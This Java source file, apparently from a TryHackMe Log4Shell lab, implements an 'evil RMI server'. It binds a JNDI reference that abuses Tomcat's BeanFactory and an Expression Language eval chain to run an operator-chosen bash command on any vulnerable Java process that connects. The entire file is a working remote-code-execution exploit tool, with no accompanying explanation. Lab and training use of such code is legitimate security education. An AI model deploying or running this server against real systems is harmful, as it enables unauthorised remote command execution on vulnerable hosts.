package thm.log4shell;

import java.rmi.registry.*;
import java.util.concurrent.Callable;

import com.sun.jndi.rmi.registry.*;

import javax.naming.*;

import org.apache.naming.ResourceRef;
import picocli.CommandLine;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;
import picocli.CommandLine.Parameters;

@Command(name = "java -jar build/libs/evilRMIServer-1.0-SNAPSHOT.jar", mixinStandardHelpOptions = true, version = "v1.0",
        description = "An evil RMI Server to help construct and run an arbitrary command.")
public class EvilRMIServerNew implements Runnable {

    @Option(names = {"-p", "--port",}, description = "The port to listen on")
    private int port = 1097;

    @Parameters(arity = "1", description = "The Command to run. Wrap in quotes if there are spaces.")
    private String cmd;

    @Override
    public void run() {
        System.out.println("Creating evil RMI registry on port " + port);
        try {
            Registry registry = LocateRegistry.createRegistry(port);

            //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            ref.add(new StringRefAddr("forceString", "x=eval"));
            //expression language to execute our command
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['bash', '-c', '" + cmd + "']).start()\")"));

            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
            registry.bind("Object", referenceWrapper);
            System.out.println("Up!");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        new CommandLine(new EvilRMIServerNew()).execute(args);
    }
}
